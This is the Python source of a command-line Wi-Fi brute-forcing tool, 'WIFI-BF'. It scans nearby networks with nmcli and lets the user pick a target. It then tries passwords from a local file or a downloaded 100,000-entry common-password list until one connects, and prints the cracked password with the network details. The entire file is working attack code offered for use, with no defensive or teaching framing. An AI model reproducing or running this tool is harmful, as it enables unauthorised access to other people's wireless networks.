try:import os,re,subprocess,colorama,urllib.request;from time import sleep;from colorama import Fore
except ModuleNotFoundError:exit('[!] Download The Missing Module !')
class cr:gr=Fore.GREEN;rd=Fore.LIGHTRED_EX;bl=Fore.LIGHTBLUE_EX;rs=Fore.RESET 
def banner():
    print(f'''
██╗    ██╗██╗███████╗██╗      ██████╗ ███████╗
██║    ██║██║██╔════╝██║      ██╔══██╗██╔════╝
██║ █╗ ██║██║█████╗  ██║█████╗██████╔╝█████╗  
██║███╗██║██║██╔══╝  ██║╚════╝██╔══██╗██╔══╝  
╚███╔███╔╝██║██║     ██║      ██████╔╝██║     
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝   
 
             By @TweakPY - @vv1ck        
''')
def cls():os.system('cls' if os.name == 'nt' else 'clear')
def developers():
    cls()
    #The original tool is taken from "flancast90" and this tool has been edited on the basis of flancast90 Tool
    print(f"""{colorama.Style.BRIGHT}
{colorama.Back.BLACK}--                                                                         --
{colorama.Back.BLACK}-- The original Tool Developer : {Fore.BLACK}github.com/flancast90{cr.rs}                     --
{colorama.Back.BLACK}-- This Tool Developer : @TweakPY - @vv1ck                                 --
--                                                                         --
{colorama.Back.RESET}{colorama.Style.RESET_ALL}
""");exit()
def NetworkINF(selected_network,decoded_line):
    try:I=subprocess.run(["nmcli","-t","-f","NAME,UUID,TYPE,DEVICE","con"],capture_output=True,text=True).stdout;s=re.findall(f'(.*?):(.*?):(.*?):(.*?)',I)[0];print('\n');print('- SSID :',selected_network);print('- PASSWORD :',decoded_line);print('- UUID :',s[1]);print('- Type :',s[2]);print('- Device :',s[3]);exit()
    except:exit()
def require_rLinux():
    systema=os.popen("uname").read().strip()
    rootc=os.popen("whoami").read().strip() 
    if systema != "Linux":print(f'{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} Sorry only for Linux');exit()
    if rootc != "root":print(f"{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} Run The Tool as {cr.rd}root{cr.rs} ");exit()
def Passwords_From_url(url):
    try:
        if url=='':url='https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt'
        return urllib.request.urlopen(url)
    except:print(f"{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} Downloading Passwords failed Check internet !{cr.rs}");exit()
def ssid(a):
    r=subprocess.run(["nmcli","-f","SSID","dev","wifi"],capture_output=True,text=True).stdout;g=r.split("\n")
    s=subprocess.run(["nmcli","-f","SECURITY","dev","wifi"],capture_output=True,text=True).stdout;gs=s.split("\n")
    networks=[k.strip() for k in g if (k.strip() != "SSID") and (k.strip() != "--") and (k.strip() != "")]
    net_type=[k.strip() for k in gs if (k.strip() != "SECURITY") and (k.strip() != "")]
    ssid=[]
    security=[]
    for i in range(len(networks)):
        if networks[i] not in ssid:
            ssid.append(networks[i])
            security.append(net_type[i])
    if (a==0):print(ssid);print(security)
    else:return [ssid,security]
def targets(networks, security_type):
    cls();print(f"{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} Select a Target: \n")
    rows,columns=os.popen('stty size','r').read().split()
    for i in range(len(networks)):print(cr.rd+"["+cr.rs+str(i+1)+cr.rd+"]  "+cr.rs+networks[i]+'\t\t\t'+cr.rd+security_type[i]+cr.rs)
def target_counter(max):
    while True:
        try:
            selected = int(input(f"\n{cr.rd}[{cr.rs}?{cr.rd}]{cr.rs} Enter Number of Target : "))
            if(selected >= 1 and selected <= max):return selected - 1
        except Exception as e:ignore=e
        print(f"{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} Invalid choice: Please pick a number between 1 and " + str(max))
def Brute_Force_Wifi(selected_network,passwords):
    cls();banner();print(f"{cr.rd}[{cr.rs}+{cr.rd}]{cr.rs} Attack Started \n\n\n");counter=0
    for password in passwords:
        password=password.strip()
        if isinstance(password,str):decoded_line=password
        else:decoded_line=password.decode("utf-8")
        if (len(decoded_line) >= 8):
            contain=False
            while contain==False:
                available=os.popen("nmcli -f SSID dev wifi").read()
                available=available.split('\n')
                available=[item.strip() for item in available]
                if selected_network in available:contain=True
                else:sleep(1)
            creds=os.popen("sudo nmcli dev wifi connect \""+selected_network+"\" password \""+decoded_line+"\"").read().strip()
            if "Error:" in creds:cls();banner();print(cr.rd+f'\r- Attempts [ {counter} ] With Password [ {decoded_line} ] Failed {cr.rs}',end='');counter+=1
            else:cls();banner();print(cr.gr+f'\r- Attempts [ {counter} ] With Password [ {decoded_line} ] Succeeded{cr.rs} ',end='');counter+=1;print(f"\n\n{cr.rd}[{cr.rs}+{cr.rd}]{cr.rs} We have Successfully Logged in to {selected_network} with {counter} Attempts ");NetworkINF(selected_network,decoded_line)
        else:pass
    cls();banner();print(f"\n{cr.rd}[{cr.rs}-{cr.rd}]{cr.rs} All Passwords Failed , We Will Get Them Next Time ..  ")
def main():
    cls();banner();require_rLinux()
    choice=int(input(cr.rd+'{'+cr.rs+' 1 '+cr.rd+'}'+cr.rs+'--'+cr.rd+'{'+cr.rs+' Passwords From url  '+cr.rd+'}'+cr.rs+'\n'+cr.rd+'{'+cr.rs+' 2 '+cr.rd+'}'+cr.rs+'--'+cr.rd+'{'+cr.rs+' Passwords From File '+cr.rd+'}'+cr.rs+'\n'+cr.rd+'{'+cr.rs+' 0 '+cr.rd+'}'+cr.rs+'--'+cr.rd+'{'+cr.rs+' Developers          '+cr.rd+'}'+cr.rs+'\n\n'+f'{cr.rd}[{cr.rs}?{cr.rd}]{cr.rs}'+f' Enter :{cr.rd} '));print(cr.rs)
    if choice==0:developers()
    elif choice==1:
        url=input(f"{cr.rd}[{cr.rs}?{cr.rd}]{cr.rs} url : ")
        if url!='':
            if 'https://' not in url:
                if 'http://' in url:passwords=Passwords_From_url(url)
                else:print(f"{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} invalid url !");exit()
            else:passwords=Passwords_From_url(url)
        else:passwords=Passwords_From_url(url)
    elif choice==2:
        filename=input(f'{cr.rd}[{cr.rs}?{cr.rd}]{cr.rs} File name : ')
        if filename=='':print(f'{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} File Name cannot Be Empty ! ');exit()
        else:
            try:
                file=open(filename,"r")
                passwords=file.readlines()
                if not passwords:print(f"{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} Password File cannot Be Empty !");exit()
                file.close()
            except FileNotFoundError:print(f'{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} File Not Found !');exit()
    else:exit()
    func_call=ssid(1)
    networks=func_call[0]
    security_type=func_call[1]
    if not networks:print(f"{cr.rd}[{cr.rs}!{cr.rd}]{cr.rs} No networks found !");exit()
    targets(networks, security_type)
    max=len(networks)
    pick=target_counter(max)
    target=networks[pick]
    cls();banner();Brute_Force_Wifi(target,passwords)
main()
